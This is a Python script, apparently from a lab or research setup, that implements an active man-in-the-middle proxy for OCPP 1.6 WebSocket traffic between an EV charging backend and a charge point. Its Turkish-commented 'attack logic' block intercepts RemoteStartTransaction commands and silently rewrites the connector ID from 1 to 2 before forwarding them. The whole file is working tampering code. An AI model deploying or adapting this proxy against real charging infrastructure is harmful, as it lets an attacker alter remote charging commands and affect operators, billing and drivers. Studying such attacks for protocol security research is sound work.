# websocket_mitm.py
import asyncio
import websockets
import logging
import json

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger()

TARGET_SERVER = "ws://localhost:9000"
LISTEN_PORT = 8090

async def client_to_target(client_ws, target_ws):
    try:
        async for message in client_ws:
            log.info(f"📤 [C->S] (T2 -> T1) Mesaj: {message}")
            await target_ws.send(message)
    except websockets.exceptions.ConnectionClosed:
        log.warning("İstemci (T2) bağlantısı kapandı.")

async def target_to_client(client_ws, target_ws):
    try:
        async for message in target_ws:
            log.info(f"📥 [S->C] (T1 -> T2) Orijinal Mesaj: {message}")
            modified_message = message
            try:
                msg_json = json.loads(message)
                # ------ SALDIRI MANTIĞI ------
                if msg_json and len(msg_json) > 2 and msg_json[2] == "RemoteStartTransaction":
                    log.warning("!!!!!!!!!!!!!! SALDIRI !!!!!!!!!!!!!!")
                    log.warning("!!! RemoteStartTransaction YAKALANDI !!!")
                    original_id = msg_json[3].get("connectorId")
                    if original_id == 1:
                        msg_json[3]["connectorId"] = 2 # 1'i 2 yap
                        modified_message = json.dumps(msg_json)
                        log.warning(f"   DEĞİŞTİRİLDİ: Connector {original_id} -> 2")
                        log.warning(f"   Yeni Mesaj: {modified_message}")
                # ------------------------------
            except Exception:
                pass # JSON değilse dokunma
            await client_ws.send(modified_message)
    except websockets.exceptions.ConnectionClosed:
        log.warning("Sunucu (T1) bağlantısı kapandı.")

async def proxy_handler(client_ws, path):
    target_url = f"{TARGET_SERVER}{path}"
    log.info(f"Yeni WebSocket bağlantısı: {client_ws.remote_address}")
    log.info(f"Hedef sunucuya bağlanılıyor: {target_url}")
    try:
        async with websockets.connect(target_url, subprotocols=['ocpp1.6']) as target_ws:
            log.info(f"✓ Proxy bağlantısı kuruldu.")
            client_task = asyncio.create_task(client_to_target(client_ws, target_ws))
            target_task = asyncio.create_task(target_to_client(client_ws, target_ws))
            await asyncio.gather(client_task, target_task)
    except Exception as e:
        log.error(f"Proxy hatası: {e}")

async def main():
    log.info("🚀 WebSocket AKTİF MITM Proxy başlatılıyor...")
    log.info(f"📡 Dinlenecek port: {LISTEN_PORT}")
    log.info(f"🎯 Hedef sunucu: {TARGET_SERVER}")
    server = await websockets.serve(proxy_handler, '0.0.0.0', LISTEN_PORT)
    await server.wait_closed()

if __name__ == "__main__":
    asyncio.run(main())